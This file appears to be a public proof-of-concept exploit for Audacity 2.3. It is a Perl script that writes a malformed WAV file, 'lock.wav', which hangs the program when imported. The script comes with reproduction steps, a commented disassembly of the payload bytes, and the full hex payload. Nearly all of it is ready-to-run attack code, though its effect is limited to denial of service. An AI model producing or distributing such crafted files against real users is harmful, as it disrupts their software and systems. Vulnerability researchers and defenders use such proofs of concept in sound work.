@@ -1,0 +1,98 @@
+# Exploit Title: AudaCity 2.3 - Denial of Service (PoC)
+# Author: Kağan Çapar
+# Discovery Date: 2018-10-19
+# Software Link: https://www.fosshub.com/Audacity.html
+# Vendor Homepage : https://www.audacityteam.org
+# Tested Version: 2.3
+# Tested on OS: Windows 10 x64/86 (Normal use CPU) & Windows 7 (High CPU usage) & Windows XP (High CPU usage)
+# other version should be affected
+
+# Steps to Reproduce: Run the perl exploit script, it will create a new
+# file with the name "lock.wav". Open Audatcity.exe
+# Go to File > Open > Import > Select "lock.wav file" 
+# you will see a locking on software.
+
+# ! /usr/bin/perl
+
+# Dump of assembler code for function data:
+# 0x0000000000004040 <+0>:	push   %rdx
+# 0x0000000000004041 <+1>:	rex.WB
+# 0x0000000000004042 <+2>:	rex.RX
+# 0x0000000000004043 <+3>:	rex.RX retq $0x158
+# 0x0000000000004047 <+7>:	add    %dl,0x41(%rdi)
+# 0x000000000000404a <+10>:	push   %rsi
+# 0x000000000000404b <+11>:	rex.RB
+# 0x000000000000404c <+12>:	rex.R
+# 0x000000000000404d <+13>:	rex.R
+# 0x000000000000404e <+14>:	rex.R
+# 0x000000000000404f <+15>:	rex.R clc 
+# 0x0000000000004051 <+17>:	(bad)  
+# 0x0000000000004052 <+18>:	(bad)  
+# 0x0000000000004053 <+19>:	incl   (%rcx)
+# 0x0000000000004055 <+21>:	add    %al,(%rcx)
+# 0x0000000000004057 <+23>:	add    %ah,(%rdx)
+# 0x0000000000004059 <+25>:	push   %rsi
+# 0x000000000000405a <+26>:	add    %al,(%rax)
+# 0x000000000000405c <+28>:	rex.R lods %ds:(%rsi),%al
+# 0x000000000000405e <+30>:	add    %al,(%rax)
+# 0x0000000000004060 <+32>:	add    (%rax),%al
+# 0x0000000000004062 <+34>:	adc    %al,(%rax)
+# 0x0000000000004064 <+36>:	add    %al,(%rax)
+# 0x0000000000004066 <+38>:	data16 (bad) 
+# 0x0000000000004068 <+40>:	movslq 0x0(%rsp,%rax,1),%esi
+# 0x000000000000406c <+44>:	add    %al,(%rax)
+# 0x000000000000406e <+46>:	rex.W lods %ds:(%rsi),%al
+# 0x0000000000004070 <+48>:	add    %al,(%rax)
+# 0x0000000000004072 <+50>:	fs (bad) 
+# 0x0000000000004074 <+52>:	je     0x40d7 <shellcode+151>
+# 0x0000000000004076 <+54>:	nop
+# 0x0000000000004077 <+55>:	pop    %rax
+# 0x0000000000004078 <+56>:	add    %eax,(%rax)
+# 0x000000000000407a <+58>:	add    %al,(%rax)
+# 0x000000000000407c <+60>:	add    %al,(%rax)
+# 0x000000000000407e <+62>:	add    %al,(%rax)
+# 0x0000000000004080 <+64>:	add    %al,(%rax)
+# 0x0000000000004082 <+66>:	add    %al,(%rax)
+# 0x0000000000004084 <+68>:	add    %al,(%rax)
+# 0x0000000000004086 <+70>:	(bad)  
+# 0x0000000000004087 <+71>:	incl   (%rax)
+# 0x0000000000004089 <+73>:	add    %al,(%rax)
+# 0x000000000000408b <+75>:	add    %bh,%bh
+# 0x000000000000408d <+77>:	incl   (%rax)
+# 0x000000000000408f <+79>:	add    %bh,%bh
+# 0x0000000000004091 <+81>:	incl   (%rax)
+# 0x0000000000004093 <+83>:	add    %bh,%bh
+# 0x0000000000004095 <+85>:	incl   (%rax)
+# 0x0000000000004097 <+87>:	add    %bh,%bh
+# 0x0000000000004099 <+89>:	incl   (%rax)
+# 0x000000000000409b <+91>:	add    %bh,%bh
+
+open(code, ">lock.wav");
+binmode(code);
+$data = 
+"\x52\x49\x46\x46\xc2\x58\x01\x00\x57\x41\x56\x45\x44\x44\x44\x44" .
+"\xf8\xff\xff\xff\x01\x00\x01\x00\x22\x56\x00\x00\x44\xac\x00\x00" .
+"\x02\x00\x10\x00\x00\x00\x66\x61\x63\x74\x04\x00\x00\x00\x48\xac" .
+"\x00\x00\x64\x61\x74\x61\x90\x58\x01\x00\x00\x00\x00\x00\x00\x00" .
+"\x00\x00\x00\x00\x00\x00\xff\xff\x00\x00\x00\x00\xff\xff\x00\x00" .
+"\xff\xff\x00\x00\xff\xff\x00\x00\xff\xff\x00\x00\xff\xff\x00\x00" .
+"\xff\xff\x00\x00\xff\xff\x00\x00\xff\xff\x00\x00\xff\xff\x00\x00" .
+"\xff\xff\x00\x00\xff\xff\x01\x00\x08\x00\x0b\x00\x0c\x00\x0b\x00" .
+"\x0c\x00\x09\x00\x07\x00\x0a\x00\x0a\x00\x07\x00\x0b\x00\x09\x00" .
+"\x08\x00\x0a\x00\x08\x00\x09\x00\x0a\x00\x0a\x00\x0a\x00\x09\x00" .
+"\x09\x00\x0a\x00\x0c\x00\x0c\x00\x0a\x00\x0b\x00\x0c\x00\x08\x00" .
+"\x0b\x00\x0d\x00\x0a\x00\x0c\x00\x0d\x00\x0a\x00\x0a\x00\x0a\x00" .
+"\x0c\x00\x0c\x00\x0d\x00\x10\x00\x0b\x00\x0d\x00\x0c\x00\x09\x00" .
+"\x0a\x00\x0e\x00\x0b\x00\x0b\x00\x0a\x00\x0e\x00\x0a\x00\x07\x00" .
+"\x08\x00\x05\x00\x08\x00\x0b\x00\x09\x00\x0b\x00\x08\x00\x08\x00" .
+"\x0b\x00\x09\x00\x07\x00\x08\x00\x07\x00\x09\x00\x0d\x00\x0c\x00" .
+"\x0b\x00\x0b\x00\x0a\x00\x0c\x00\x0f\x00\x0a\x00\x0a\x00\x0b\x00" .
+"\x0f\x00\x07\x00\x09\x00\x07\x00\x09\x00\x08\x00\x05\x00\x0a\x00" .
+"\x0a\x00\x07\x00\x08\x00\x0b\x00\x06\x00\x0d\x00\x0c\x00\x0c\x00" .
+"\x0b\x00\x0c\x00\x0b\x00\x09\x00\x0b\x00\x0b\x00\x09\x00\x0f\x00" .
+"\x08\x00\x0a\x00\x0f\x00\x0b\x00\x0d\x00\x0a\x00\x0a\x00\x09\x00" .
+"\x09\x00\x0d\x00\x10\x00\x0d\x00\x0b\x00\x0c\x00\x0e\x00\x09\x00" .
+"\x0c\x00\x0e\x00\x0a\x00\x0b\x00\x0b\x00\x0b\x00\x0a\x00\x0e\x00";
+
+print code $data;
+close(code);
